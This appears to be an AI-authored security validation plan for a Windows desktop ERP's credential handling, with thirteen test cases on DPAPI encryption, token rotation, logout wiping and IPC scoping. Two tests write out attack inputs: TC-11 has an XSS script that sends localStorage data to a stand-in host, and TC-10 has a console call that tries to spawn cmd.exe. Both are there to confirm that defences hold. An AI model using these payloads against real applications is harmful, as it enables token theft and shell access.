# EduPulse ERP — Credential Security Validation Plan
## Work Package 03F — Test Cases, Acceptance Gates & Security Verification Matrix

**Project:** EduPulse ERP — Desktop Transition Sprint (Week 00 / Day 02)
**Target Platform:** Windows 10 / Windows 11 Enterprise (Tauri v2 + Spring Boot 3.3.4)
**Author:** Antigravity AI Engineering Assistant (Security Baseline)
**Date:** 2 November 2026
**Document Status:** Approved Quality Assurance & Verification Specification

---

## 1. Executive Summary & Verification Methodology

To validate the security boundaries defined across Work Packages 03A through 03E, this document establishes the formal **Credential Security Validation Plan**. Every security control—ranging from Windows DPAPI encryption at rest to Tauri IPC capability scoping and backend token revocation—is mapped to concrete, executable test cases with measurable pass/fail acceptance criteria.

```
+----------------------------------------------------------------------------------------------------+
|                                    TEST HARNESS & LAYER MAPPING                                    |
+------------------------------------+---------------------------------------------------------------+
| Layer 1: Presentation & Bridge     | Vitest + React Testing Library + Tauri Mock IPC               |
| Layer 2: Native Rust Subsystem     | Cargo Test + Windows API integration harnesses                |
| Layer 3: Backend Security Filter   | SpringBootTest + MockMvc + JJWT Test Fixtures                 |
| Layer 4: End-to-End Desktop Target | Playwright for Desktop / Tauri Driver on Windows 10 & 11      |
+------------------------------------+---------------------------------------------------------------+
```

---

## 2. Comprehensive Security Test Matrix (13 Core Test Areas)

---

### TC-01: Credential Encryption and Decryption at Rest
- **Target Component:** Rust Native DPAPI Bridge (`src-tauri/`)
- **Objective:** Verify that `CryptProtectData` encrypts the refresh token and `CryptUnprotectData` returns the identical plaintext without data loss or padding corruption.
- **Preconditions:** Active Windows user session on Windows 10/11.
- **Execution Steps:**
  1. Generate a mock 512-byte signed JWT string.
  2. Invoke native internal function `encrypt_token(&jwt, &entropy)`.
  3. Inspect raw bytes of generated ciphertext file (`vault.dat`).
  4. Invoke native internal function `decrypt_token(&ciphertext, &entropy)`.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Raw `vault.dat` does NOT contain the plaintext JWT string in any encoding (ASCII, UTF-8, UTF-16, or Base64). `decrypt_token` returns exact initial plaintext string.
  - **FAIL:** Plaintext substrings discovered in `vault.dat`, or decryption returns mismatched bytes.

---

### TC-02: Application Restart Persistence
- **Target Component:** End-to-End Desktop Shell (React + Tauri Core)
- **Objective:** Verify that an authenticated user session seamlessly restores across application restarts without showing the login screen.
- **Preconditions:** Desktop app logged in with active valid refresh token.
- **Execution Steps:**
  1. Log into EduPulse Desktop as faculty user.
  2. Terminate the application process completely (`taskkill /IM edupulse.exe`).
  3. Verify `edupulse.exe` process is terminated.
  4. Relaunch `edupulse.exe`.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Application cold startup retrieves token from `vault.dat`, calls `/auth/refresh` silently, populates Zustand memory, and routes directly to `/dashboard` in under 800ms.
  - **FAIL:** Application renders `/login` screen or throws unhandled JavaScript exception.

---

### TC-03: Invalid or Corrupted DPAPI Ciphertext Handling
- **Target Component:** Rust Error Boundary & React Error Handler
- **Objective:** Verify that tampered, truncated, or corrupted `vault.dat` files fail safely without crashing the application.
- **Preconditions:** Application is closed; `vault.dat` exists.
- **Execution Steps:**
  1. Open `%APPDATA%\com.edupulse.erp\vault.dat` with a binary editor.
  2. Overwrite 32 bytes in the middle of the file with random garbage bytes (`0xFF`).
  3. Launch `edupulse.exe`.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** `CryptUnprotectData` returns error code `SEC_E_DECRYPT_FAILURE`. Rust sanitizes error, deletes the corrupted `vault.dat`, returns `CredentialError::CorruptVault`, and React renders `/login` with toast: *"Your saved session was invalid and has been reset."* Application does NOT panic or crash.
  - **FAIL:** Application crashes, hangs indefinitely, or surfaces raw Windows hex error codes to the user.

---

### TC-04: Missing Windows Credentials / New Profile Launch
- **Target Component:** Tauri Native Core
- **Objective:** Verify initial clean installation behavior when no credentials exist on disk.
- **Preconditions:** Fresh test environment; `%APPDATA%\com.edupulse.erp\vault.dat` does not exist.
- **Execution Steps:**
  1. Launch `edupulse.exe`.
  2. Inspect IPC response from `check_credential_status` and `secure_retrieve_token`.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** `check_credential_status` returns `has_stored_credential: false`. `secure_retrieve_token` returns `has_credential: false`. Application renders `/login` view cleanly.
  - **FAIL:** Throws unhandled file not found exception or stalls on splash screen.

---

### TC-05: Access Token Expiration & Silent In-Flight Renewal
- **Target Component:** Axios Interceptor (`api.ts`) + Spring Boot Filter
- **Objective:** Verify that when the 15-minute access token expires, the client silently refreshes the token and retries the original request without user disruption.
- **Preconditions:** User is actively viewing a student record; mock access token expires.
- **Execution Steps:**
  1. Fast-forward or mock access token expiration (`exp = now - 5s`).
  2. User clicks "Load Attendance Records" (`GET /api/v1/attendance`).
  3. Observe network log and UI state.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** First request returns HTTP 401. Axios catches 401, invokes `retrieveRefreshToken`, posts to `/auth/refresh`, updates in-memory token, and transparently replays `GET /api/v1/attendance`. Attendance table loads successfully. User observes zero disruption or login redirect.
  - **FAIL:** User is kicked to `/login` view, or the request fails with permanent error.

---

### TC-06: Refresh Token Rotation Verification
- **Target Component:** Spring Boot Backend (`AuthService`) + Desktop Vault
- **Objective:** Verify that every refresh token presentation generates a new refresh token and permanently blacklists the old one.
- **Preconditions:** User possesses Refresh Token `RT-1`.
- **Execution Steps:**
  1. Desktop client calls `POST /auth/refresh` with `RT-1`.
  2. Backend responds with `AT-2` and `RT-2`.
  3. Immediately execute a secondary curl request sending `RT-1` again.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Second request with `RT-1` is rejected with `HTTP 401 Unauthorized { message: "Refresh token has been revoked" }`. `vault.dat` on disk now holds encrypted `RT-2`.
  - **FAIL:** Second request succeeds, proving single-use token rotation is broken.

---

### TC-07: Concurrent 401 Refresh Request Queueing
- **Target Component:** Axios Interceptor `failedQueue`
- **Objective:** Verify that when multiple concurrent requests receive HTTP 401 simultaneously, exactly ONE `/auth/refresh` call is dispatched.
- **Preconditions:** Access token expired.
- **Execution Steps:**
  1. Trigger 10 simultaneous API requests via `Promise.all([apiClient.get('/api/v1/students'), apiClient.get('/api/v1/departments'), ...])`.
  2. Monitor outgoing HTTP traffic in network inspector.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Exactly 1 `POST /auth/refresh` request is dispatched to the backend. All 10 failed requests pause in `failedQueue` and successfully resolve once the single refresh completes. Zero redundant refresh calls.
  - **FAIL:** Multiple `/auth/refresh` calls are triggered, causing subsequent refresh calls to fail due to single-use token rotation collisions.

---

### TC-08: Complete Logout Cleanup & Cryptographic Disk Scrubbing
- **Target Component:** React Logout + Rust In-Place Wipe
- **Objective:** Verify that explicit user logout purges in-memory state and forensically scrubs `vault.dat`.
- **Preconditions:** User is authenticated and `vault.dat` exists.
- **Execution Steps:**
  1. User clicks "Logout".
  2. Inspect browser memory heap and Zustand store.
  3. Inspect filesystem at `%APPDATA%\com.edupulse.erp\vault.dat`.
  4. Attempt forensic file carving on the unlinked disk sector.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Zustand state has `token: null, user: null`. `vault.dat` was overwritten with random bytes and zeros before unlinking; the file no longer exists on disk.
  - **FAIL:** `vault.dat` remains on disk or memory retains the decrypted token string.

---

### TC-09: Revoked Session Trapping & Self-Destruction
- **Target Component:** Central Backend + Desktop Client
- **Objective:** Verify client behavior when an administrator forcefully revokes all sessions for a user.
- **Preconditions:** Desktop client is running.
- **Execution Steps:**
  1. In admin portal, click "Revoke Sessions for User".
  2. Desktop user attempts to navigate to a new department view (`GET /api/v1/departments`).
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Request or subsequent refresh returns HTTP 401 with `TOKEN_REVOKED`. Desktop client automatically purges memory, wipes `vault.dat`, and displays: *"Your session was terminated by an administrator."*
  - **FAIL:** Client ignores revocation or remains in broken state.

---

### TC-10: IPC Command Authorization & Capability Scoping
- **Target Component:** Tauri Capability Engine (`src-tauri/capabilities/`)
- **Objective:** Verify that an unauthorized window or injected script cannot invoke credential commands.
- **Preconditions:** WebView2 developer console enabled.
- **Execution Steps:**
  1. Open DevTools in WebView2.
  2. From the console, attempt to call an unauthorized command or spawn a shell:
     `window.__TAURI__.core.invoke('tauri-plugin-shell:execute', { cmd: 'cmd.exe' })`
  3. Attempt to invoke `secure_store_token` with an invalid 10MB payload.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Shell execution call is rejected immediately by the Tauri IPC router with `IPC_COMMAND_NOT_FOUND` or permission denied. The 10MB payload is rejected with `InvalidTokenFormat`.
  - **FAIL:** Native command executes or causes backend buffer overflow.

---

### TC-11: XSS Renderer Compromise Containment
- **Target Component:** Content Security Policy (CSP) & Renderer Sandbox
- **Objective:** Verify that an injected script in the DOM cannot extract long-term credentials or communicate with external servers.
- **Preconditions:** Malicious HTML payload injected into a course description.
- **Execution Steps:**
  1. Render payload: `<script>fetch('https://evil-attacker.com/steal?data=' + localStorage.getItem('auth-storage'))</script>`.
  2. Observe browser network inspector and console.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** CSP blocks external network connection to `evil-attacker.com`. `localStorage.getItem('auth-storage')` returns `null` (since tokens are no longer stored in localStorage). Attacker gains zero long-term credentials.
  - **FAIL:** Request exfiltrates token or localStorage contains plaintext refresh token.

---

### TC-12: Shared Windows Account & Multi-User Isolation
- **Target Component:** Windows DPAPI Kernel Subsystem
- **Objective:** Verify that User B cannot decrypt User A's `vault.dat` on a multi-user Windows machine.
- **Preconditions:** Multi-user Windows 10/11 workstation with User A (`Alice`) and User B (`Bob`).
- **Execution Steps:**
  1. Alice logs into EduPulse; `vault.dat` is generated in Alice's `%APPDATA%`.
  2. Alice logs out of Windows.
  3. Bob logs into Windows.
  4. Bob attempts to run a utility calling `CryptUnprotectData` on Alice's `vault.dat` file.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** Windows DPAPI kernel fails with error `SEC_E_DECRYPT_FAILURE` (`0x8009000D`). Bob cannot decrypt Alice's credentials.
  - **FAIL:** Bob successfully decrypts Alice's token.

---

### TC-13: Domain Roaming Profile Boundary Verification
- **Target Component:** Active Directory Workstation Testbed
- **Objective:** Verify application stability when a user logs into a different physical PC in an enterprise domain.
- **Preconditions:** Windows Active Directory domain with two physical client machines (PC-1 and PC-2).
- **Execution Steps:**
  1. User logs into EduPulse on PC-1.
  2. User walks to PC-2, logs into Windows, and opens EduPulse Desktop.
- **Pass / Fail Acceptance Criteria:**
  - **PASS:** If DPAPI roaming keys are unconfigured, application cleanly detects missing or invalid local vault on PC-2 and presents the standard login screen. User enters credentials, logs in successfully, and establishes a valid session on PC-2 without corrupting PC-1.
  - **FAIL:** Application throws crash dialog or locks user out permanently.

---

## 3. Measurable Acceptance Gates (Pre-Production Checklist)

Before releasing the EduPulse Desktop Edition for institutional pilot deployments, all thirteen test cases must meet the following automated and manual quality gates:

```
+----------------------------------------------------------------------------------------------------+
|                                    QUALITY ACCEPTANCE GATES                                        |
+-------------------+---------------------------------------------------+----------------------------+
| Gate ID           | Quality Verification Metric                       | Required Pass Threshold    |
+-------------------+---------------------------------------------------+----------------------------+
| GATE-SEC-01       | Static plain-text audit of %APPDATA% files        | 0 plaintext JWT substrings |
| GATE-SEC-02       | Automated Rust unit tests for DPAPI bridge        | 100% Passing (0 failures)  |
| GATE-SEC-03       | Single-use token rotation replay test             | 100% Replay Rejection      |
| GATE-SEC-04       | Concurrent refresh queue under 20 parallel calls  | Exactly 1 /auth/refresh    |
| GATE-SEC-05       | In-place cryptographic wipe verification on exit  | 0 residual bytes on disk   |
| GATE-SEC-06       | Content Security Policy compliance scan           | 0 CSP violation warnings   |
| GATE-SEC-07       | Cold startup time with DPAPI restoration          | < 800 ms to interactive    |
+-------------------+---------------------------------------------------+----------------------------+
```

---

## 4. Conclusion

This validation plan provides the definitive testing harness for EduPulse Windows Desktop Edition credentials. Proceed immediately to final review and commit execution.
